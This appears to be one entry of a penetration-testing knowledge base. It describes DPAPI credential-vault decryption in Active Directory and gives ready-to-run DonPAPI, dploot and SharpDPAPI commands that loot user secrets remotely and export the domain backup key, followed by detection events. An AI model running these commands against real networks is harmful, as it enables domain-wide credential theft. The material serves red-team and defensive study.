---
id: dpapi
type: technique
label: "DPAPI / credential-vault decryption"
phase: "cred"
tools: ["mimikatz", "dploot", "donpapi"]
cve: null
detect: "DPAPI master-key access events."
mitre: "T1555"
tag: null
---


# DPAPI / credential-vault decryption

### Affected object / attribute
**DPAPI master keys / domain backup key** on the DC.

### Concept (deep)
DPAPI protects user/machine secrets. The **domain DPAPI backup key** (DA-held) decrypts **any user’s** DPAPI master keys; alternatively decrypt in-user-context or machine context (SYSTEM).

### Exhaustive commands
```bash
# ── Remote DPAPI looting ─────────────────────────────────────────────
DonPAPI.py corp.local/administrator:'Password123!'@10.10.10.5

# ── Retrieve the domain backup key ──────────────────────────────────
dploot backupkeys -u administrator -p 'Password123!' -d corp.local -t 10.10.10.5

# ── DSInternals backup key (on DC) ──────────────────────────────────
SharpDPAPI.exe backupkey /server:DC01
```

### Detection
Access to `%APPDATA%\Microsoft\Protect`; **4662** on the `BCKUPKEY` container; backup-key export audit.

---
